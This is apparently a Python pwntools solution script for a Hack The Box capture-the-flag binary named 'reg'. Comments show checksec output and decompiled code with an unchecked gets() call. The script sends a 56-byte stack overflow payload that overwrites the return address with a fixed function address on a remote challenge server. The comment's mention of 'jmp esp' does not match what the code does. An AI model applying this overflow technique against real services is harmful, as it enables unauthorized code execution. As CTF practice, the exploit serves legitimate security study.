from pwn import *
import pwn
'''
┌──(hanoz㉿kali)-[~/Desktop/htb/challenges/reg]
└─$ checksec --file=reg
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   80) Symbols       No    0               3               reg

As we can see, there's no canary, but NX is enabled, so we can probably do jmp esp. Let's try

void run(void)

{
  char local_38 [48];
  
  initialize();
  printf("Enter your name : ");
  gets(local_38);
  puts("Registered!");
  return;
}
This is the function we have to overwrite. So let's try overwriting 56 bytes
'''

padding = b"A" * 56
ret = pwn.p64(0x0000000000401206) #0x0000000000401206

payload = padding + ret
print(len(payload),payload)
#p = process("./reg")

p = remote('178.128.162.158',31323) #178.128.162.158:31323
ip1 = p.recv()
print(ip1)
p.sendline(payload)
ip2 = p.recv()
print(ip2)
ip3 = p.recv()
print(ip3)
#p.interactive()
